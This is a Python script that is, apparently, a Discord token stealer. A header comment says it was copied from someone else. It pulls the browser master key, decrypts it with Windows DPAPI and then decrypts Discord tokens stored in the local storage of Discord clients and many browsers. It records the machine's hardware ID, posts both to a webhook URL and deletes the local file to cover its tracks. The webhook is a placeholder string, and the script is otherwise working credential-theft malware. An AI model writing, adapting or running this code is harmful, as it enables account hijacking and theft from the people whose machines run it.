### i skidded this from someone else lmao ###



from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import listdir, getenv, remove
from json import loads
from re import findall
import os
import subprocess
import requests

tokens = []
cleaned = []
checker = []

WEBHOOK_URL = "GAYYYYYYY"

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def get_hwid():
    try:
        result = subprocess.check_output("wmic csproduct get uuid", shell=True).decode().split("\n")
        hwid = result[1].strip()
        return hwid
    except Exception as e:
        return f"Error: {e}"

def get_token():
    already_check = []
    cleaned = []
    tokens = []
    checker = []

    local = getenv('LOCALAPPDATA')
    roaming = getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"

    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    hwid = get_hwid()

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except:
            continue

        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith((".ldb", ".log")):
                continue
            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for line in files.readlines():
                        line.strip()
                        for value in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(value)
            except PermissionError:
                continue

        for token in tokens:
            if token.endswith("\\"):
                token = token.replace("\\", "")
            if token not in cleaned:
                cleaned.append(token)

        for token in cleaned:
            try:
                decrypted_token = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError:
                continue
            checker.append(decrypted_token)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)

    with open("tokens.txt", "w") as f:
        f.write(f"HWID: {hwid}\n")
        f.write("="*50 + "\n")
        for i, token in enumerate(already_check, start=1):
            f.write(f"Token {i}: {token}\n")
            f.write("="*50 + "\n")

    with open("tokens.txt", "rb") as f:
        files = {'file': ('tokens.txt', f)}
        payload = {'content': 'File ran!'}
        response = requests.post(WEBHOOK_URL, data=payload, files=files)

    remove("tokens.txt")

if __name__ == '__main__':
    get_token()
